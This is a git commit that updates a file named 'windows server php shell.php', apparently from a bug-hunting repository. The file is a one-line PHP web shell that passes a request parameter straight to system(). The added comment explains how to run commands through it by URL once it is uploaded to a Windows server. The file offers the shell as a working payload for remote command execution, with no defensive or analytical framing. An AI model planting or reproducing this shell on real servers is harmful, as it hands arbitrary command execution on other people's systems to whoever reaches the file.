392718861f1d6dae795855c5773d7b3124280950
tonythebughunter <144837471+tonythebughunter@users.noreply.github.com>
2024-06-21 14:20:26 -0400

    Update windows server php shell.php

--- windows server php shell.php
+++ windows server php shell.php
@@ -1,1 +1,4 @@
 <?php system($_REQUEST['cmd']); ?>
+
+
+##when uploaded to the windows server, it can be accessibe via parameter. ie lets say this shell's name is shell therefore it will be http://server/shell?cmd=ipconfig
